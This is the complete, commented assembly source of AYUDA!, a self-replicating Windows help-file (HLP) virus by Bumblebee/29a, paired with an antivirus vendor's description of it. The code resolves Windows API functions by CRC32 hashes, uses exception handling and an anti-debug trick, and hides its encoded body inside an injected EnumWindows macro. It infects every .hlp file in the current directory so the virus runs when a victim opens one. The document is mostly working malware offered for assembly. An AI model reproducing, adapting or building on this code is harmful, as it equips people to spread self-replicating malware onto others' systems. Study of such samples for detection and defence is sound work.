
;
;  AYUDA! coded by Bumblebee/29a
;  the generic HLP infector (tm)
;
;  AYUDA is the spanish word for help. If you need 'ayuda' infecting hlp
;  files this is the source you're looking for ;)
;  But keep in mind that AYUDA is not equal to tutorial!
;
;  Disclaimer:
; 
;       . This  is  the  source  code  of  a VIRUS. The  author  is  not
;         responsabile of any  damage that may occur due to the assembly
;         of this file. Pontius Pilate is washing his hands ;)
;
;  Features:
;
;       . Takes control directly from the  hlp file using macros and the
;         EnumWindows function. The virus body is stored in the call.
;       . Searches for the required APIs using CRCs instead of names.
;       . Uses SEH.
;       . Infects hlp files adding a EnumWindows call in the system file
;         and plazing this new system at the end of file.
;       . Uses size padding as infection sign.
;
;  Hlp infection brief:
;
;       . The hlp  infection  is so easy. First you must  understand the
;       internal format of hlp files: is like a pakaged file system.
;       Yeah!  There are  directories, files and so.  Once you have this
;       part there is  another point you  must take into account: how to
;       give  control to the virus. The solution that AYUDA  exploits is
;       that WinHlp32 let us say the  kind of parameters an imported API
;       will use. So if you look for any function with callback features
;       (all the enum functions), you can change the parameter that uses
;       the address of  code to be executed by a string. An this  string
;       will be the virus code. WinHlp32 allocates memory for the string
;       (a  string is a  pointer to a  vector of chars)  and passes that
;       address to the enum function. Once you have the control you must
;       execute the  code... and that's all? NOPE! Your  virus code MUST
;       be a string! So you need to change the code to fit in the string
;       required by WinHlp32. At  this case i've  encoded the virus in a
;       way that  allows to  change the code to make  WinHlp32 happy and
;       later restore it for normal execution. The virus  generates some
;       code that pushes the entire virus into the stack. This code it's
;       ok for  WinHlp32  (avoids on its  body some characters) and when
;       executes restores the  whole virus into the stack  and the jumps
;       there, does its  work, fixes  the stack  and returns  ending the
;       callback process.
;       I think that with this little explanation and the full commented
;       source you'll be able to understand this kind of infection.
;
;       Excuse my english!
;
;                                                     The way of the bee
;
;
; Description from:
; http://www.viruslist.com/eng/viruslist.asp?id=3981&key=000010000800002
; from AVP.
;
; WinHLP.Pluma 
;
;
; This is Windows32 HLP files infector, it does function and replicate as
; a Windows Help script embedded in help file structure. See also WinHLP.Demo
; and Win95.SK".
;
; When infected HLP file is opened, the Windows Help system processes virus
; script and executes all functions placed there. By using a trick the virus
; forces Help system to execute a specially prepared data as binary Windows32
; program, these data are included in one of instructions in the virus
; script. These data themselves are the "start-up" routine that builds the
; main infection routine and executes it. The infection routine is a valid
; Windows32 procedure, and it is executed as a Windows32 application.
;
; When infection routine takes control, it scans Windows kernel (KERNEL32.DLL
; image loaded in Windows memory) in usual for Win32 executable files
; parasitic infectors, and gets addresses of necessary Windows functions
; from there. The infection routine then looks for all Windows Help files in
; the current directory, and infects them all.
;
; While infecting the virus modifies internal HLP file structure, adds its
; script to the "SYSTEM" area, converts its code to start-up routine and
; includes it into the script.
;
; The virus does not manifest itself in any way. It contains the text
; strings:
;
; < AYUDA! Coded by Bumblebee/29a >
; Cumpliendo con mi oficio
; piedra con piedra, pluma a pluma,
; pasa el invierno y deja
; sitios abandonados
; habitaciones muertas:
; yo trabajo y trabajo,
; debo substituir tantos olvidos,
; llenar de pan las tinieblas,
; fundar otra vez la esperanza.
;
;

.486p
.model flat
locals

        extrn           ExitProcess:PROC

HLPHEADER       struc
hhMagic                 dd      ?
hhDirectoryStart        dd      ?
hhNonDirectoryStart     dd      ?
hhEntireFileSize        dd      ?
HLPHEADER       ends

HLPFILEHEADER   struc
fhReservedSpace         dd      ?
fhUsedSpace             dd      ?
fhFileFlags             db      ?
HLPFILEHEADER   ends

BTREEHEADER     struct
bthMagic                dw      ?
bthFlags                dw      ?
bthPageSize             dw      ?
bthStructure            db      10h dup(?)
bthMustBeZero           dw      ?
bthPageSplits           dw      ?
bthRootPage             dw      ?
bthMustBeNegOne         dw      ?
bthTotalPages           dw      ?
bthNLeves               dw      ?
bthTotalEntries         dd      ?
BTREEHEADER     ends

; from BC++ Win32 API on-line Reference
WIN32_FIND_DATA         struc
dwFileAttributes        dd      0
dwLowDateTime0          dd      ?       ; creation
dwHigDateTime0          dd      ?
dwLowDateTime1          dd      ?       ; last access
dwHigDateTime1          dd      ?
dwLowDateTime2          dd      ?       ; last write
dwHigDateTime2          dd      ?
nFileSizeHigh           dd      ?
nFileSizeLow            dd      ?
dwReserved              dd      0,0
cFileName               db      260 dup(0)
cAlternateFilename      db      14 dup(0)
                        db      2 dup(0)
WIN32_FIND_DATA         ends

        K32WIN9X        equ     0bff70000h      ; Windows 95/98
        vSize           equ     vEnd-vBegin     ; size of the baby
        PADDING         equ     7               ; infection sign

.DATA

dummy           db      'WARNING - This is a virus laucher - WARNING'

.CODE

inicio:
        push    eax                             ; simulate the callback for
        push    eax                             ; 1st generation
        push    offset goOut
        sub     esp,((vSize/2)+1)*2             ; why i'm doing this? ;)
        jmp     virusBegin

goOut:
        push    0h
        call    ExitProcess

vBegin  label   byte
virusBegin:

        pushad                                  ; save all regs

        call    delta                           ; get delta offset
delta:
        pop     ebp
        sub     ebp,offset delta

        lea     eax,dword ptr [esp-8h]          ; setup SEH
        xor     edi,edi
        xchg    eax,dword ptr fs:[edi]
        lea     edi,exception+ebp
        push    edi
        push    eax

        mov     esi,K32WIN9X                    ; fixed addr of the K32
        cmp     word ptr [esi],'ZM'             ; K32! are you there?
        jne     quitSEH

        ; little anti-debug trick
        xor     edi,edi
        add     esi,dword ptr fs:[edi+20h]

        ; Get APIs stuff with CRC32 instead of names...
        mov     esi,dword ptr [esi+3ch]
        add     esi,K32WIN9X
        mov     esi,dword ptr [esi+78h]
        add     esi,K32WIN9X
        add     esi,1ch

        lodsd
        add     eax,K32WIN9X
        mov     dword ptr [address+ebp],eax
        lodsd
        add     eax,K32WIN9X
        mov     dword ptr [names+ebp],eax
        lodsd
        add     eax,K32WIN9X
        mov     dword ptr [ordinals+ebp],eax

        sub     esi,16
        lodsd
        mov     dword ptr [nexports+ebp],eax

        xor     edx,edx
        mov     dword ptr [expcount+ebp],edx
        lea     eax,FSTAPI+ebp

searchl:
        mov     esi,dword ptr [names+ebp]
        add     esi,edx
        mov     esi,dword ptr [esi]
        add     esi,K32WIN9X
        push    eax edx
        movzx   di,byte ptr [eax+4]
        call    CRC32
        xchg    ebx,eax
        pop     edx eax
        cmp     ebx,dword ptr [eax]
        je      fFound
        add     edx,4
        inc     dword ptr [expcount+ebp]
        push    edx
        mov     edx,dword ptr [expcount+ebp]
        cmp     dword ptr [nexports+ebp],edx
        pop     edx
        je      quitSEH
        jmp     searchl
fFound:
        shr     edx,1
        add     edx,dword ptr [ordinals+ebp]
        xor     ebx,ebx
        mov     bx,word ptr [edx]
        shl     ebx,2
        add     ebx,dword ptr [address+ebp]
        mov     ecx,dword ptr [ebx]
        add     ecx,K32WIN9X

        mov     dword ptr [eax+5],ecx
        add     eax,9
        xor     edx,edx
        mov     dword ptr [expcount+ebp],edx
        lea     ecx,ENDAPI+ebp
        cmp     eax,ecx
        jb      searchl

        ; infect all the hlp files in current directory
        lea     esi,find_data+ebp
        push    esi
        lea     esi,hlpMask+ebp
        push    esi
        call    dword ptr [_FindFirstFileA+ebp]
        inc     eax
        jz      quitSEH
        dec     eax

        mov     dword ptr [findHnd+ebp],eax

findNext:
        mov     eax,dword ptr [find_data.nFileSizeLow+ebp]
        mov     ecx,PADDING                     ; test if it's infected
        xor     edx,edx                         ; yet
        div     ecx
        or      edx,edx                         ; reminder is zero?
        jz      skipThisFile

        lea     esi,find_data.cFileName+ebp
        call    infect

skipThisFile:
        lea     esi,find_data+ebp
        push    esi
        push    dword ptr [findHnd+ebp]
        call    dword ptr [_FindNextFileA+ebp]  ; Find next file
        or      eax,eax
        jnz     findNext

        push    dword ptr [findHnd+ebp]
        call    dword ptr [_FindClose+ebp]      ; close find handle

quitSEH:
        xor     esi,esi                         ; quit SEH
        pop     dword ptr fs:[esi]
        pop     eax

        popad
        add     esp,((vSize/2)+1)*2             ; fix stack
        xor     eax,eax                         ; return FALSE
        ret     8                               ; pop the args of the call
                                                ; (are two: 2*4=8 bytes)

exception:
        xor     esi,esi                         ; we are not under
        mov     eax,dword ptr fs:[esi]          ; win9x... a pitty
        mov     esp,dword ptr [eax]
        jmp     quitSEH

;
; does the hlp infection
; IN: esi addr of file name
;
infect:
        xor     eax,eax
        push    eax
        push    80h
        push    3h
        push    eax
        push    eax
        push    80000000h OR 40000000h
        push    esi
        call    dword ptr [_CreateFileA+ebp]
        inc     eax
        jz      errorOut
        dec     eax

        mov     dword ptr [fHnd+ebp],eax

        xor     eax,eax
        push    eax
        push    eax
        push    eax
        push    4h
        push    eax
        push    dword ptr [fHnd+ebp]
        call    dword ptr [_CreateFileMappingA+ebp]
        or      eax,eax
        jc      errorOutClose

        mov     dword ptr [mfHnd+ebp],eax

        xor     eax,eax
        push    eax
        push    eax
        push    eax
        push    00000004h OR 00000002h
        push    dword ptr [mfHnd+ebp]
        call    dword ptr [_MapViewOfFile+ebp]
        or      eax,eax
        jz      errorOutCloseMap

        ; here begins the hlp infection stuff

        ; save begin of hlp header
        mov     edi,eax

        ; check is a valid HLP file
        cmp     dword ptr [edi.hhMagic],00035f3fh
        jne     notNiceHlp

        ; get file size information in the header (not the same than
        ; 'file in disk' size)
        mov     ecx,dword ptr [eax.hhEntireFileSize]
        mov     dword ptr [fileSize+ebp],ecx

        ; goto directory start
        add     edi,dword ptr [edi.hhDirectoryStart]
        add     edi,size HLPFILEHEADER
        ; check is a valid directory
        cmp     word ptr [edi],293bh
        jne     notNiceHlp
        ; i don't want indexed data, so only one level b-trees
        ; are nice for me ;)
        cmp     word ptr [edi.bthNLeves],1
        jne     notNiceHlp

        ; scan for |SYSTEM directory.
        ; search 512 bytes into the b-tree and ignore the internal
        ; structures of b-tree.
        add     edi,size BTREEHEADER
        mov     ecx,200h

searchSystemDir:
        cmp     dword ptr [edi],'SYS|'
        je      foundSystemDir
        inc     edi
        loop    searchSystemDir
        jmp     notNiceHlp

foundSystemDir:
        ; as i only infect non-indexed hlp files, i'm sure the
        ; data that follows the |SYSTEM zstring is the offset of
        ; the directory. 1st skip the zstring
        add     edi,8
        ; now goto to the directory (offset from hlp header)
        ; and set the new system directory at the end of file
        mov     esi,dword ptr [fileSize+ebp]
        xchg    esi,dword ptr [edi]
        mov     edi,esi
        add     edi,eax

        ; save begin of this file
        mov     edx,edi
        add     edi,size HLPFILEHEADER

        ; check is a system directory
        cmp     word ptr [edi],036ch
        jne     notNiceHlp

        ; check version
        mov     esi,edi
        add     esi,0ch
        cmp     word ptr [edi+2],10h
        ja      noTitleHere

        ; if has title, skip it (version <= 16)
skipTitle:
        inc     esi
        cmp     byte ptr [esi-1],0
        je      skipTitle
noTitleHere:
        mov     edi,esi

        ; get size of the directory
        mov     esi,dword ptr [edx]

        ; the max size of the macro, just an aproximation
        add     esi,((vSize/2)*10)+1000h

        ; alloc a temporary buffer
        pushad
        push    00000004h
        push    00001000h
        push    esi
        push    0
        call    dword ptr [_VirtualAlloc+ebp]
        or      eax,eax
        jne     bufferOk
        popad
        jmp     notNiceHlp

bufferOk:
        mov     dword ptr [mHnd+ebp],eax
        popad

        ; copy system directory plus our macro to the buffer

        ; 1st old system
        mov     edi,dword ptr [mHnd+ebp]
        mov     esi,edx
        mov     ecx,dword ptr [edx]
        rep     movsb

        ; begin 'our macro' generation
        ; save mapped file handle
        push    eax
        ; save begin of our macros
        push    edi
        lea     esi,hlpMacro0+ebp
        mov     ecx,hlpMacroSize0
        rep     movsb

        ; generate the macro 'virus body' ;)
        ; it sholud be more simple but... hehe
        lea     ecx,vBegin+ebp
        lea     esi,vEnd+ebp
        dec     ecx
        dec     esi
getNext:
        cmp     byte ptr [esi],0                ; those chars must be
        je      fix                             ; changed 'cause they have
        cmp     byte ptr [esi],22h              ; a sentimental value
        je      fix                             ; for winhlp32 in macroz
        cmp     byte ptr [esi],27h
        je      fix
        cmp     byte ptr [esi],5ch
        je      fix
        cmp     byte ptr [esi],60h
        je      fix
        mov     al,0b4h
        mov     ah,byte ptr [esi]
        stosw
        dec     esi
        cmp     esi,ecx
        je      macroDoneFix
getNextInPair:
        cmp     byte ptr [esi],0
        je      fix2
        cmp     byte ptr [esi],22h
        je      fix2
        cmp     byte ptr [esi],27h
        je      fix2
        cmp     byte ptr [esi],5ch
        je      fix2
        cmp     byte ptr [esi],60h
        je      fix2
        mov     al,0b0h
        mov     ah,byte ptr [esi]
        stosw
        mov     ax,5066h
        stosw
        dec     esi
        cmp     esi,ecx
        je      macroDone
        jmp     getNext
fix:
        mov     al,0b4h
        mov     ah,byte ptr [esi]
        dec     ah
        stosw
        mov     ax,0c4feh
        stosw
        dec     esi
        cmp     esi,ecx
        je      macroDoneFix
        jmp     getNextInPair
fix2:
        mov     al,0b0h
        mov     ah,byte ptr [esi]
        dec     ah
        stosw
        mov     ax,0c0feh
        stosw
        mov     ax,5066h
        stosw
        dec     esi
        cmp     esi,ecx
        je      macroDone
        jmp     getNext

macroDoneFix:
        mov     al,0b0h
        mov     ah,90h
        stosw
        mov     ax,5066h
        stosw

macroDone:
        ; end the macro
        lea     esi,hlpMacro1+ebp
        mov     ecx,hlpMacroSize1
        rep     movsb

        ; fix the macro size
        pop     esi                             ; get begin of macros
        mov     ecx,edi                         ; end of macros
        sub     ecx,esi                         ; size of macros
        sub     ecx,offset macro1-hlpMacro
                                                ; sub size of 1st macro and
                                                ; and the header of 2nd
        mov     word ptr [esi+offset macroSize-hlpMacro],cx
                                                ; store it! (at its offset)
        pop     eax

        ; into edi the size of the new system
        sub     edi,dword ptr [mHnd+ebp]
        mov     dword ptr [systemSize+ebp],edi

        ; fix directory size plus header
        mov     edx,dword ptr [mHnd+ebp]
        mov     dword ptr [edx],edi
        ; fix directory size
        push    edi
        sub     edi,size HLPFILEHEADER
        mov     dword ptr [edx+4],edi
        pop     edi

        ; increase hlp file size
        add     dword ptr [eax.hhEntireFileSize],edi
        ; and save
        push    dword ptr [eax.hhEntireFileSize]

        push    eax
        call    dword ptr [_UnmapViewOfFile+ebp]

        push    dword ptr [mfHnd+ebp]
        call    dword ptr [_CloseHandle+ebp]

        ; get new hlp file size
        pop     eax
        ; calculate size with padding
        mov     ecx,PADDING
        xor     edx,edx
        div     ecx
        inc     eax
        xor     edx,edx
        mul     ecx
        mov     dword ptr [padSize+ebp],eax

        xor     eax,eax
        push    eax
        push    dword ptr [padSize+ebp]
        push    eax
        push    4h
        push    eax
        push    dword ptr [fHnd+ebp]
        call    dword ptr [_CreateFileMappingA+ebp]
        or      eax,eax
        jc      errorOutClose

        mov     dword ptr [mfHnd+ebp],eax

        xor     eax,eax
        push    dword ptr [padSize+ebp]
        push    eax
        push    eax
        push    00000004h OR 00000002h
        push    dword ptr [mfHnd+ebp]
        call    dword ptr [_MapViewOfFile+ebp]
        or      eax,eax
        jz      errorOutCloseMap

        ; add the modified system directory
        mov     edi,eax
        add     edi,dword ptr [fileSize+ebp]
        mov     esi,dword ptr [mHnd+ebp]
        mov     ecx,dword ptr [systemSize+ebp]
        rep     movsb

        push    eax
        push    00008000h
        push    0h
        push    dword ptr [mHnd+ebp]
        call    dword ptr [_VirtualFree+ebp]
        pop     eax

notNiceHlp:
        push    eax
        call    dword ptr [_UnmapViewOfFile+ebp]

errorOutCloseMap:
        push    dword ptr [mfHnd+ebp]
        call    dword ptr [_CloseHandle+ebp]

errorOutClose:
        push    dword ptr [fHnd+ebp]
        call    dword ptr [_CloseHandle+ebp]

errorOut:
        ret

;
; CRC32
;
;  IN:  esi     offset of data to do CRC32
;       edi     size to do CRC32
;
;  OUT:
;       eax     CRC32
;
; Original routine by Vecna. Gracias!
; This is one of these piezes of code that became essential to
; the virus coder.
;
CRC32:
	cld
        xor     ecx,ecx
        dec     ecx
	mov     edx,ecx
	push    ebx
NextByteCRC:
	xor     eax,eax
	xor     ebx,ebx
	lodsb
	xor     al,cl
	mov     cl,ch
	mov     ch,dl
	mov     dl,dh
	mov     dh,8
NextBitCRC:
	shr     bx,1
	rcr     ax,1
	jnc     NoCRC
	xor     ax,08320h
	xor     bx,0EDB8h
NoCRC:
        dec     dh
	jnz     NextBitCRC
	xor     ecx,eax
	xor     edx,ebx
        dec     edi
	jnz     NextByteCRC
	pop     ebx
	not     edx
	not     ecx
	mov     eax,edx
	rol     eax,16
	mov     ax,cx
	ret

copyright       db      '< AYUDA! Coded by Bumblebee/29a >'

messForAvers    db      0dh,0ah
                db      'Cumpliendo con mi oficio',0dh,0ah
                db      'piedra con piedra, pluma a pluma,',0dh,0ah
                db      'pasa el invierno y deja',0dh,0ah
                db      'sitios abandonados',0dh,0ah
                db      'habitaciones muertas:',0dh,0ah
                db      'yo trabajo y trabajo,',0dh,0ah
                db      'debo substituir tantos olvidos,',0dh,0ah
                db      'llenar de pan las tinieblas,',0dh,0ah
                db      'fundar otra vez la esperanza.',0dh,0ah

; CRC32 and plaze to store APIs used
FSTAPI                  label   byte
CrcCreateFileA          dd      08c892ddfh
size0                   db      12
_CreateFileA            dd      0

CrcMapViewOfFile        dd      0797b49ech
size1                   db      14
_MapViewOfFile          dd      0

CrcCreatFileMappingA    dd      096b2d96ch
size2                   db      19
_CreateFileMappingA     dd      0

CrcUnmapViewOfFile      dd      094524b42h
size3                   db      16
_UnmapViewOfFile        dd      0

CrcCloseHandle          dd      068624a9dh
size4                   db      12
_CloseHandle            dd      0

CrcFindFirstFileA       dd      0ae17ebefh
size5                   db      15
_FindFirstFileA         dd      0

CrcFindNextFileA        dd      0aa700106h
size6                   db      14
_FindNextFileA          dd      0

CrcFindClose            dd      0c200be21h
size7                   db      10
_FindClose              dd      0

CrcVirtualAlloc         dd      04402890eh
size8                   db      13
_VirtualAlloc           dd      0

CrcVirtualFree          dd      02aad1211h
size9                   db      12
_VirtualFree            dd      0
ENDAPI                  label   byte

; data for the macro generation
hlpMacroSize    equ     (endOfMacro1-hlpMacro)+vSize
hlpMacro        label   byte
hlpMacro0       db      4,0,macro0Ends-offset macro0,0
macro0          db      'RR("USER32","EnumWindows","SU")',0
macro0Ends      label   byte
                db      4,0
macroSize       dw      ?
macro1          db      'EnumWindows("'
endOfMacro0     label   byte
hlpMacro1:      jmp     esp
                db      '",0)',0
endOfMacro1     label   byte
hlpMacroSize0   equ     endOfMacro0-hlpMacro
hlpMacroSize1   equ     endOfMacro1-offset hlpMacro1

; several handles
fHnd            dd      0
mfHnd           dd      0
mHnd            dd      0
; to store... erm
fileSize        dd      0
; file size with padding
padSize         dd      0
; the size of the generated system file
systemSize      dd      0
; used into API search
address         dd      0
names           dd      0 
ordinals        dd      0
nexports        dd      0
expcount        dd      0
; for find files
hlpMask         db      '*.hlp',0,0
findHnd         dd      0
find_data       WIN32_FIND_DATA <?>

vEnd    label   byte

ends
end     inicio

